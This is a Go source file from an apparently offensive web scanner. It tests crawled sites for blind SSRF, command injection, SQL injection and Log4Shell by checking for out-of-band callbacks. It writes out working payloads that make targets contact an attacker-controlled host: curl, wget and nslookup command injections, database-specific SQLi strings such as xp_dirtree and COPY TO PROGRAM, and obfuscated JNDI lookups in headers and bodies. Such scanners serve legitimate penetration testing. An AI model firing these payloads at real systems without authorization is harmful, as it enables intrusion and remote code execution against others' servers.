package scanner

import (
	"fmt"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

// --- Blind SSRF (OOB Confirmed) ---

func scanBlindSSRF(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, oobClient *oob.Client) []Finding {
	var findings []Finding
	if oobClient == nil || !oobClient.Active() {
		return findings
	}

	ssrfParams := []string{"url", "uri", "link", "src", "source", "fetch", "request",
		"proxy", "redirect", "image", "avatar", "webhook", "callback", "endpoint", "dest", "href"}

	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	for u, params := range crawl.Params {
		for _, p := range params {
			pLower := strings.ToLower(p)
			isSSRF := false
			for _, sp := range ssrfParams {
				if strings.Contains(pLower, sp) {
					isSSRF = true
					break
				}
			}
			if !isSSRF {
				continue
			}

			wg.Add(1)
			go func(baseURL, param string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				uid := oobClient.GenerateUID()
				payload := oobClient.PayloadURL(uid)
				testURL := injectParam(baseURL, param, payload)
				http.Get(testURL)

				// Wait for callback
				time.Sleep(2 * time.Second)
				if oobClient.Poll(uid, 6*time.Second) {
					mu.Lock()
					findings = append(findings, Finding{
						Type: "Blind SSRF (OOB Confirmed)", Severity: "critical",
						URL: testURL, Param: param, Payload: payload,
						Detail:   "DNS/HTTP callback received — server made outbound request to attacker-controlled domain",
						Template: "apex-blind-ssrf",
					})
					mu.Unlock()
				}
			}(u, p)
		}
	}
	wg.Wait()
	return findings
}

// --- Blind Command Injection (OOB Confirmed) ---

func scanBlindCMDi(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, oobClient *oob.Client) []Finding {
	var findings []Finding
	if oobClient == nil || !oobClient.Active() {
		return findings
	}

	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	for u, params := range crawl.Params {
		for _, p := range params {
			wg.Add(1)
			go func(baseURL, param string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				uid := oobClient.GenerateUID()
				oobURL := oobClient.PayloadURL(uid)

				payloads := []string{
					fmt.Sprintf(";curl %s", oobURL),
					fmt.Sprintf("|curl %s", oobURL),
					fmt.Sprintf("`curl %s`", oobURL),
					fmt.Sprintf("$(curl %s)", oobURL),
					fmt.Sprintf(";wget %s", oobURL),
					fmt.Sprintf("& nslookup %s &", oobClient.DNSPayload(uid)),
				}

				for _, payload := range payloads {
					testURL := injectParam(baseURL, param, payload)
					http.Get(testURL)
				}

				time.Sleep(3 * time.Second)
				if oobClient.Poll(uid, 5*time.Second) {
					mu.Lock()
					findings = append(findings, Finding{
						Type: "Blind Command Injection (OOB Confirmed)", Severity: "critical",
						URL: baseURL, Param: param,
						Detail:   "Server executed injected command — callback received at OOB server",
						Template: "apex-blind-cmdi",
					})
					mu.Unlock()
				}
			}(u, p)
		}
	}
	wg.Wait()
	return findings
}

// --- Blind SQLi (OOB Confirmed) ---

func scanBlindSQLiOOB(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, oobClient *oob.Client) []Finding {
	var findings []Finding
	if oobClient == nil || !oobClient.Active() {
		return findings
	}

	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	for u, params := range crawl.Params {
		for _, p := range params {
			wg.Add(1)
			go func(baseURL, param string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				uid := oobClient.GenerateUID()
				oobDomain := oobClient.DNSPayload(uid)

				payloads := []string{
					// MySQL
					fmt.Sprintf("' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.%s\\\\a'))-- -", oobDomain),
					// MSSQL
					fmt.Sprintf("'; EXEC master..xp_dirtree '//%s/a'-- -", oobDomain),
					// PostgreSQL
					fmt.Sprintf("'; COPY (SELECT '') TO PROGRAM 'nslookup %s'-- -", oobDomain),
					// Oracle
					fmt.Sprintf("' AND UTL_HTTP.REQUEST('http://%s/')='1", oobDomain),
				}

				for _, payload := range payloads {
					testURL := injectParam(baseURL, param, payload)
					http.Get(testURL)
				}

				time.Sleep(3 * time.Second)
				if oobClient.Poll(uid, 5*time.Second) {
					mu.Lock()
					findings = append(findings, Finding{
						Type: "Blind SQL Injection (OOB DNS Confirmed)", Severity: "critical",
						URL: baseURL, Param: param,
						Detail:   "Database executed DNS lookup to attacker domain — blind SQLi confirmed",
						Template: "apex-blind-sqli-oob",
					})
					mu.Unlock()
				}
			}(u, p)
		}
	}
	wg.Wait()
	return findings
}

// --- Log4Shell (OOB Confirmed) ---

func scanLog4Shell(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, oobClient *oob.Client) []Finding {
	var findings []Finding
	if oobClient == nil || !oobClient.Active() {
		return findings
	}

	uid := oobClient.GenerateUID()
	oobDomain := oobClient.PayloadURL(uid)

	log4jPayloads := []string{
		fmt.Sprintf("${jndi:ldap://%s/}", oobDomain),
		fmt.Sprintf("${jndi:dns://%s}", oobClient.DNSPayload(uid)),
		fmt.Sprintf("${${lower:j}ndi:ldap://%s/}", oobDomain),
		fmt.Sprintf("${${::-j}${::-n}${::-d}${::-i}:ldap://%s/}", oobDomain),
		fmt.Sprintf("${j${:}ndi:ldap://%s/}", oobDomain),
	}

	// Inject into every possible vector
	for _, page := range crawl.Pages[:min(15, len(crawl.Pages))] {
		for _, payload := range log4jPayloads[:3] {
			// Headers (most common vector)
			items := []engine.RequestItem{{
				URL:    page.URL,
				Method: "GET",
				Headers: map[string]string{
					"User-Agent":      payload,
					"X-Forwarded-For": payload,
					"Referer":         payload,
					"X-Api-Version":   payload,
					"Authorization":   "Bearer " + payload,
				},
			}}
			for range http.BatchRequest(items, 1) {
			}

			// Query param
			sep := "?"
			if strings.Contains(page.URL, "?") {
				sep = "&"
			}
			http.Get(page.URL + sep + "q=" + url.QueryEscape(payload))

			// POST body
			http.Post(page.URL, "text/plain", payload)
		}
	}

	// Check for callbacks
	time.Sleep(4 * time.Second)
	if oobClient.Poll(uid, 6*time.Second) {
		target := ""
		if len(crawl.Pages) > 0 {
			target = crawl.Pages[0].URL
		}
		findings = append(findings, Finding{
			Type: "Log4Shell RCE (CVE-2021-44228) — OOB Confirmed", Severity: "critical",
			URL: target, Detail: "JNDI lookup reached attacker server — full RCE via LDAP/RMI",
			Template: "apex-log4shell",
		})
	}
	return findings
}
